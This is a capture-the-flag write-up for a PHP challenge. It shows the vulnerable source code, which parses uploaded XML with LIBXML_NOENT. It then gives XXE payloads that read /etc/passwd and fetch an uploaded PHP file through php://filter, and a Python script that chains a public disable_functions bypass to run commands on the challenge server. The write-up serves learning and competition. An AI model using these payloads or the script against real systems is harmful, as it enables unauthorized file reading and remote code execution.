# 31 Line PHP

## Description

Like the legendary ~~one-~~ 31- line php challenge

**`62.84.114.238/`**

_On the last step, you’ll need a recently published 0day._

## Solution

Here's the challenge source code:

```php
<?php
session_start();
if (!isset($_POST["data"])) {
    highlight_file(__FILE__);
    die();
}
if (!isset($_SESSION["id"])) {
    $_SESSION["id"] = md5(random_bytes(16));
}
$id = $_SESSION["id"];
echo "Welcome, $id\r\n";

if (!file_exists("/var/www/html/upload/" . $id)) {
    mkdir("/var/www/html/upload/" . $id, 0755, true);
}
$name = $_FILES["data"]["name"];
move_uploaded_file($_FILES["data"]["tmp_name"],"/var/www/html/upload/$id/$name");
if (PHP_VERSION_ID < 80000) {
    // This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
    // disabled by default, so this function is no longer needed to protect against XXE attacks.
    $loader = libxml_disable_entity_loader(true);
}
$xmlfile = file_get_contents("/var/www/html/upload/$id/$name");
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT);
$creds = simplexml_import_dom($dom);
$user = $creds->user;
$pass = $creds->pass;
echo "You have logged in as user $user";
unlink("/var/www/html/upload/$id/$name");
?>
```

### XXE Injection

We can quite clearly see that this must have something to do with XML parsing. One part of the code stood out in particular:

```php
if (PHP_VERSION_ID < 80000) {
    // This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
    // disabled by default, so this function is no longer needed to protect against XXE attacks.
    $loader = libxml_disable_entity_loader(true);
}
```

The comments seem reasonable. Does this mean that there is no XXE here?

It turns out that this part was inspired by a [WordPress bug](https://blog.sonarsource.com/wordpress-xxe-security-vulnerability) a while back this year. While the above justification is correct, the nuance lies in how `loadXML()` is called.

It turns out that the `LIBXML_NOENT` flag actually _enables_ entity substitution - the flag means that no entities will be left in the result, i.e. external entities will be fetched and substituted.

```php
$dom->loadXML($xmlfile, LIBXML_NOENT);
```

So, surprisingly, we _do_ have an XXE here. Here's an LFI payload:

```
------WebKitFormBoundaryO6d3yhN5GpxEyAKE
Content-Disposition: form-data; name="data"; filename="test.xml"
Content-Type: text/xml

<!DOCTYPE myDoc [ <!ENTITY myExternalEntity SYSTEM "file:///etc/passwd" > ]>
<creds>
    <user>&myExternalEntity;</user>
    <pass>mypass</pass>
</creds>
------WebKitFormBoundaryO6d3yhN5GpxEyAKE
Content-Disposition: form-data; name="data"

test
------WebKitFormBoundaryO6d3yhN5GpxEyAKE--
```

### PHP Code Injection

I started searching for flag files but had no luck. After asking the organizers, they confirmed that I must get an RCE somehow.

This got me looking back at the source code. Note that we have a remote file upload here - the uploaded file is at `/var/www/html/upload/$id/$name` and we have access to this file through the web server (the web root is `/var/www/html`). The only caveat is that the file is deleted as soon as the XML parsing is done.

This still allows us to request the file _while_ the XML parsing is being performed. If we upload a PHP file, we can request that file again within the XML and use `php://filter/` to reflect the output into the `<user>` tag.

```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/89e05a8b6e028eeda25a0845b9b3daaa/payload.php" >]>
<creds>
    <user>&xxe;</user>
    <pass></pass>
</creds>
    
<?php phpinfo(); ?>
```

Using the `phpinfo()` output, we can see the `disable_functions` configuration.

![](<../../.gitbook/assets/image (79) (1) (1).png>)

As we can see, all of the functions that can give us a shell command execution are disabled.

### disable\_functions Bypass

The challenge hinted at a zero-day being needed for the last step.

A recent (published just 5 days ago) [PoC](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass) allowed us to bypass `disable_functions` on all PHP versions.

This allowed us to get shell RCE and run the `/readflag` binary to read the flag.

```python
import requests
import re
import base64

FILENAME = 'payload.php'
TARGET = 'http://62.84.114.238'
COMMAND = '/readflag'

with open(FILENAME, 'w') as f:
    f.write("""
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/3354e780fbef91d0ebc5875d77aee578/{}" >]>
<creds>
    <user>&xxe;</user>
    <pass></pass>
</creds>
    """.format(FILENAME) + """
<?php
# PHP 7.0-8.0 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=54350
# 
# This exploit should work on all PHP 7.0-8.0 versions
# released as of 2021-10-06
#
# Author: https://github.com/mm0r1

pwn('{}');""".format(COMMAND) + r"""

... EXPLOIT HERE ...

?>
""")

r = requests.post(TARGET,
    files = {'data': (FILENAME, open(FILENAME, 'rb'))},
    data = {'data': 'test'},
    headers = {'Cookie': 'PHPSESSID=85ab80ed3e1f88a7827a75c5f9dc7c1f'}
)

print(r.text)

match = re.search('You have logged in as user (.*)', r.text)
print(match[1])
print(base64.b64decode(match[1]).decode())
```

The flag is `spbctf{XX3_2_rCe_w3Ll_D0n3}`\
